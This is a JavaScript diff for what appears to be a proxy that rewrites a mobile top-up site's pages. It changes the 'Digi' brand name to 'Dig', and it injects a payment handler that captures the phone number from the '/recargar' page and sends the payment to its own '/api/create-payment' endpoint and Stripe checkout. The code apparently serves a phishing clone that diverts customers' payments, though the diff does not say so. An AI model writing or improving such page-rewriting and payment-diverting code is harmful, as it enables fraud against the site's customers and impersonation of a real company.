@@ -55,7 +55,7 @@ function replaceDigiWithDig(text) {
     if (match === 'DIGI') return 'DIG';
     if (match === 'Digi') return 'Dig';
     if (match === 'digi') return 'dig';
-    return match;
+    return match; 
   });
 
   for (let i = protectedElements.length - 1; i >= 0; i--) {
@@ -162,86 +162,77 @@ async function modifyHTML(response) {
       }
 
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
-  if (sourceEvent) {
-    sourceEvent.preventDefault();
-    sourceEvent.stopPropagation();
-  }
-  
-  try {
-    const isFirstStep = window.location.pathname.includes('/recargar') && 
-                       !document.querySelector('[data-amount], .recharge-amount');
-    
-    if (isFirstStep) {
-      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-      if (phoneInput && phoneInput.value) {
+        if (sourceEvent) {
+          sourceEvent.preventDefault();
+          sourceEvent.stopPropagation();
+        }
+        
         try {
-          const cleanedPhone = phoneInput.value.replace(/\D/g, '');
-          // Store the phone number regardless of format for later use
-          sessionStorage.setItem('rechargePhoneNumber', cleanedPhone);
-          localStorage.setItem('rechargePhoneNumber', cleanedPhone);
-          window.phoneNumberForPayment = cleanedPhone;
-          console.log('Stored phone number:', cleanedPhone);
-        } catch (e) { console.error('Error storing phone:', e); }
-      }
-      return true;
-    }
-    
-    if (!phoneNumber) {
-      try {
-        phoneNumber = window.phoneNumberForPayment || 
-                     sessionStorage.getItem('rechargePhoneNumber') || 
-                     localStorage.getItem('rechargePhoneNumber') || '';
-      } catch (e) { console.error('Error retrieving phone:', e); }
-      
-      if (!phoneNumber) {
-        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-        phoneNumber = phoneInput?.value.replace(/\D/g, '') || '';
-      }
-    }
-    
-    // Clean any non-digit characters
-    phoneNumber = phoneNumber.replace(/\D/g, '');
-    
-    if (!phoneNumber) {
-      alert('Error: Phone number required');
-      return false;
-    }
-
-    console.log('Using phone number for payment:', phoneNumber);
-    
-    if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-      amount = getSelectedAmountFromRadios() || '5';
-    }
-    
-    console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
-    
-    const response = await fetch('/api/create-payment', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        amount: amount, 
-        phoneNumber: phoneNumber,
-        successUrl: window.location.origin + '/payment-success',
-        cancelUrl: window.location.origin + '/payment-cancel'
-      })
-    });
-    
-    if (!response.ok) throw new Error('Payment request failed');
-    const data = await response.json();
-    
-    if (data.url) {
-      window.location.href = data.url;
-    } else if (data.sessionId) {
-      const stripe = await window.stripeLoadedPromise;
-      if (!stripe) throw new Error('Stripe failed to load');
-      await stripe.redirectToCheckout({ sessionId: data.sessionId });
-    }
-    return false;
-  } catch (error) {
-    alert('Payment error: ' + error.message);
-    return false;
-  }
-};
+          const isFirstStep = window.location.pathname.includes('/recargar') && 
+                             !document.querySelector('[data-amount], .recharge-amount');
+          
+          if (isFirstStep) {
+            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
+            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
+              try {
+                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
+                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
+                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
+              } catch (e) { console.error('Error storing phone:', e); }
+            }
+            return true;
+          }
+          
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            try {
+              phoneNumber = window.phoneNumberForPayment || 
+                           sessionStorage.getItem('rechargePhoneNumber') || 
+                           localStorage.getItem('rechargePhoneNumber') || '';
+            } catch (e) { }
+            if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+              const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+              phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+            }
+          }
+          
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            alert('Error: Valid 9-digit phone number required');
+            return false;
+          }
+          
+          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+            amount = getSelectedAmountFromRadios() || '5';
+          }
+          
+          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
+          
+          const response = await fetch('/api/create-payment', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              amount: amount, 
+              phoneNumber: phoneNumber,
+              successUrl: window.location.origin + '/payment-success',
+              cancelUrl: window.location.origin + '/payment-cancel'
+            })
+          });
+          
+          if (!response.ok) throw new Error('Payment request failed');
+          const data = await response.json();
+          
+          if (data.url) {
+            window.location.href = data.url;
+          } else if (data.sessionId) {
+            const stripe = await window.stripeLoadedPromise;
+            if (!stripe) throw new Error('Stripe failed to load');
+            await stripe.redirectToCheckout({ sessionId: data.sessionId });
+          }
+          return false;
+        } catch (error) {
+          alert('Payment error: ' + error.message);
+          return false;
+        }
+      };
       
       document.addEventListener('DOMContentLoaded', function() {
         // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
